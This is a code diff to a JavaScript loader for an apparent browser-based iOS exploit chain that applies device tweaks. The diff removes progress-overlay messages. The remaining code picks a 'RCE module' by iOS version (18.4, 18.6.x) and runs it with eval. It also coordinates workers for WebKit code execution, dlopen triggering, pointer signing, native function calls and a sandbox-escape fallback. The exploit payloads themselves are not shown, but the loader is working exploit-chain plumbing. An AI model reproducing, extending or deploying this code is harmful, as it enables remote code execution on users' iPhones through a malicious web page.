@@ -61,11 +61,6 @@ try {
     if (__sbx0FallbackStart < 0) __sbx0FallbackStart += 4;
     globalThis.__ls_sbx0_fallback_start = __sbx0FallbackStart;
 } catch (e) { globalThis.__ls_sbx0_fallback_start = 0; }
-try {
-    var __lsParams5 = new URLSearchParams(location.search || '');
-    var __overlayParam = __lsParams5.has('chain_overlay') ? __lsParams5.get('chain_overlay') : (__lsParams5.has('sb_overlay') ? __lsParams5.get('sb_overlay') : '1');
-    globalThis.__ls_enable_chain_overlay = (__overlayParam !== '0' && __overlayParam !== 'false');
-} catch (e) { globalThis.__ls_enable_chain_overlay = true; }
 var basePrefix = location.pathname.replace(/\/[^\/]*$/, '');
 var localHost = location.origin + basePrefix;
 try {
@@ -108,20 +103,10 @@ function print(x, reportError = false, dumphex = false) {
         console.error("log send failed:", e);
     }
 }
-function stage(text, state = '') {
-    try {
-        window.parent.postMessage({
-            type: 'lightsaber_stage',
-            text: String(text || 'LS chain in progress'),
-            state: state || ''
-        }, '*');
-    } catch (e) {}
-}
 function redirect()
 {
     if (__ls_terminal_sent) return;
     __ls_terminal_sent = true;
-    stage("LS chain complete", "complete");
     try { sessionStorage.removeItem('ls_running'); } catch(e) {}
     // Use '*' as targetOrigin to match upstream DarkSword. location.origin
     // would silently drop the message if the iframe's computed origin
@@ -135,7 +120,6 @@ function fail(reason)
     if (__ls_terminal_sent) return;
     __ls_terminal_sent = true;
     let text = reason ? String(reason) : 'Unknown loader failure';
-    stage("LS chain failed", "error");
     print("FAIL: " + text, true);
     try { sessionStorage.removeItem('ls_running'); } catch(e) {}
     try { window.parent.postMessage({ type: 'lightsaber_error', text: text }, '*'); } catch (e) {}
@@ -196,10 +180,8 @@ const ios_version = (function() {
     print("WARNING: Could not detect iOS version from UA!");
     return null;
 })();
-print("Tweak selection: tweaks=" + (globalThis.__ls_tweaks || '(none)') + " level=" + (globalThis.__ls_powercuff_level || '(none)') + " sbc=" + globalThis.__ls_sbc_dock_icons + "/" + globalThis.__ls_sbc_hs_cols + "x" + globalThis.__ls_sbc_hs_rows + " chainOverlay=" + globalThis.__ls_enable_chain_overlay + " rawSearch=" + (location.search || '(empty)'));
-stage("LS loader starting");
+print("Tweak selection: tweaks=" + (globalThis.__ls_tweaks || '(none)') + " level=" + (globalThis.__ls_powercuff_level || '(none)') + " sbc=" + globalThis.__ls_sbc_dock_icons + "/" + globalThis.__ls_sbc_hs_cols + "x" + globalThis.__ls_sbc_hs_rows + " rawSearch=" + (location.search || '(empty)'));
 print("Loading worker code...");
-stage("LS loading WebKit worker");
 let workerCode = "";
 if(ios_version == '18,6' || ios_version == '18,6,1' || ios_version == '18,6,2') {
     print("Using worker for iOS 18.6.x");
@@ -215,7 +197,6 @@ if (!workerCode || !workerCode.trim()) {
     throw new Error("worker code load failed");
 }
 print("Worker code loaded: " + (workerCode ? workerCode.length + " bytes" : "FAILED (null/empty)"));
-stage("LS WebKit worker ready");
 let workerBlob = new Blob([workerCode],{type:'text/javascript'});
 let workerBlobUrl = URL.createObjectURL(workerBlob);
 (() => {
@@ -224,7 +205,6 @@ let workerBlobUrl = URL.createObjectURL(workerBlob);
     }
     function main() {
         print("=== main() started ===");
-        stage("LS WebKit exploit starting");
         const randomValues = new Uint32Array(32);
         const begin = Date.now();
         const origin = location.origin;
@@ -236,7 +216,6 @@ let workerBlobUrl = URL.createObjectURL(workerBlob);
             fail("Worker error: " + msg);
         };
         print("Worker created");
-        stage("LS worker created");
         const dlopen_workers = [];
         async function prepare_dlopen_workers() {
         for (let i = 1; i <= 2; ++i) {
@@ -263,17 +242,14 @@ let workerBlobUrl = URL.createObjectURL(workerBlob);
             case 'redirect':
             {
                 print("[MSG] Redirecting...");
-                stage("LS chain complete", "complete");
                 doRedirect();
                 break;
             }
             case 'prepare_dlopen_workers':
             {
                 print("[MSG] Preparing dlopen workers...");
-                stage("LS preparing native loader");
                 await prepare_dlopen_workers();
                 print("[MSG] dlopen workers prepared, notifying worker");
-                stage("LS native loader ready");
                 worker.postMessage({
                 type: 'dlopen_workers_prepared'
                 });
@@ -282,7 +258,6 @@ let workerBlobUrl = URL.createObjectURL(workerBlob);
             case 'trigger_dlopen1':
             {
                 print("[MSG] trigger_dlopen1");
-                stage("LS native loader step 1");
                 dlopen_workers[0].postMessage({
                 type: 'dlopen'
                 });
@@ -294,7 +269,6 @@ let workerBlobUrl = URL.createObjectURL(workerBlob);
             case 'trigger_dlopen2':
             {
                 print("[MSG] trigger_dlopen2");
-                stage("LS native loader step 2");
                 dlopen_workers[1].postMessage({
                 type: 'dlopen'
                 });
@@ -306,7 +280,6 @@ let workerBlobUrl = URL.createObjectURL(workerBlob);
             case 'sign_pointers':
             {
                 print("[MSG] sign_pointers");
-                stage("LS native bridge setup");
                 iframe.contentDocument.write('1');
                 worker.postMessage({
                 type: 'setup_fcall',
@@ -317,7 +290,6 @@ let workerBlobUrl = URL.createObjectURL(workerBlob);
                 ls_sbc_hs_rows: globalThis.__ls_sbc_hs_rows,
                 ls_sbc_statbar: globalThis.__ls_sbc_statbar,
                 ls_sbc_hide_labels: globalThis.__ls_sbc_hide_labels,
-                ls_enable_chain_overlay: globalThis.__ls_enable_chain_overlay === true,
                 ls_site_origin: globalThis.__ls_site_origin || "",
                 ls_site_host: globalThis.__ls_site_host || "",
                 ls_site_path: globalThis.__ls_site_path || "/"
@@ -327,7 +299,6 @@ let workerBlobUrl = URL.createObjectURL(workerBlob);
             case 'slow_fcall':
             {
                 print("[MSG] slow_fcall");
-                stage("LS native fcall running");
                 iframe.contentDocument.write('1');
                 worker.postMessage({
                 type: 'slow_fcall_done'
@@ -360,7 +331,6 @@ let workerBlobUrl = URL.createObjectURL(workerBlob);
             }
             case 'stage1_failed':
             {
-                stage("LS WebKit stage failed", "error");
                 fail("Stage1 failed: " + (data.error || "unknown error"));
                 break;
             }
@@ -375,7 +345,6 @@ let workerBlobUrl = URL.createObjectURL(workerBlob);
         try
         {
         print("Loading RCE module...");
-        stage("LS loading WebKit exploit");
         let rceCode = "";
         if(ios_version == '18,6' || ios_version == '18,6,1' || ios_version == '18,6,2') {
                 print("Using rce_module_18.6.js");
@@ -388,10 +357,8 @@ let workerBlobUrl = URL.createObjectURL(workerBlob);
         try
         {
             print("Evaluating RCE module...");
-            stage("LS evaluating WebKit exploit");
             eval(rceCode);
             print("RCE module eval completed");
-            stage("LS WebKit exploit ready");
         }
         catch(e)
         {
@@ -403,7 +370,6 @@ let workerBlobUrl = URL.createObjectURL(workerBlob);
             if(ios_version == '18,6' || ios_version == '18,6,1' || ios_version == '18,6,2')
             {
                 print("Sending stage1_rce to worker (iOS 18.6 path) tweaks=" + (globalThis.__ls_tweaks || '(none)') + " level=" + (globalThis.__ls_powercuff_level || 'heavy') + " sbx0FallbackStart=" + (globalThis.__ls_sbx0_fallback_start || 0));
-                stage("LS WebKit stage running");
                 worker.postMessage({
                     type: 'stage1_rce',
                     desiredHost,
@@ -416,7 +382,6 @@ let workerBlobUrl = URL.createObjectURL(workerBlob);
                     ls_sbc_hs_rows: globalThis.__ls_sbc_hs_rows,
                     ls_sbc_statbar: globalThis.__ls_sbc_statbar,
                     ls_sbc_hide_labels: globalThis.__ls_sbc_hide_labels,
-                    ls_enable_chain_overlay: globalThis.__ls_enable_chain_overlay === true,
                     ls_site_origin: globalThis.__ls_site_origin || "",
                     ls_site_host: globalThis.__ls_site_host || "",
                     ls_site_path: globalThis.__ls_site_path || "/",
@@ -426,20 +391,17 @@ let workerBlobUrl = URL.createObjectURL(workerBlob);
             else
             {
                 print("Starting check_attempt (iOS 18.4 path), sbx0FallbackStart=" + (globalThis.__ls_sbx0_fallback_start || 0));
-        stage("LS WebKit check running");
         var attempt = new check_attempt();
         (async function() {
             var maxRetries = 5;
             for (var retryIdx = 0; retryIdx < maxRetries; retryIdx++) {
                 if (retryIdx > 0) {
                     print("check_attempt retry " + retryIdx + "/" + maxRetries);
-                    stage("LS WebKit check retry " + retryIdx + "/" + maxRetries);
                     await new Promise(function(r) { setTimeout(r, 100); });
                 }
                 var result = false;
                 try { result = await attempt.start(); } catch(e) { print("check_attempt threw: " + e); }
                 if (result) {
-                    stage("LS WebKit stage running");
                     worker.postMessage({
                         type: 'stage1',
                         begin,
